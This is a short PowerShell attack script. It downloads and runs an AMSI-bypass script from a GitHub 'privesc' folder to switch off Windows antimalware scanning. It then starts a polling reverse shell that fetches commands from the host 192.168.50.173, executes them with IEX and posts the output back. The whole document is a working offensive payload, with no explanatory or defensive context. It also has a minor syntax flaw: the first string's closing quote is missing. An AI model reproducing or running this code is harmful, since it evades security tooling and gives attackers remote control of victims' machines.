$scriptUrl = "https://raw.githubusercontent.com/paulkwalton/thescriptvault/refs/heads/main/privesc/windows/amsi-bypass.ps1

$scriptBlock = {
    try {
        IEX (Invoke-WebRequest -Uri $scriptUrl)
    }
    catch {
        Write-Error "Error executing external script: $_"
        # Consider exiting the script here if the error is critical
        # exit 1
    }
}

. $scriptBlock

$s='192.168.50.173:443';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/fef40df7 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
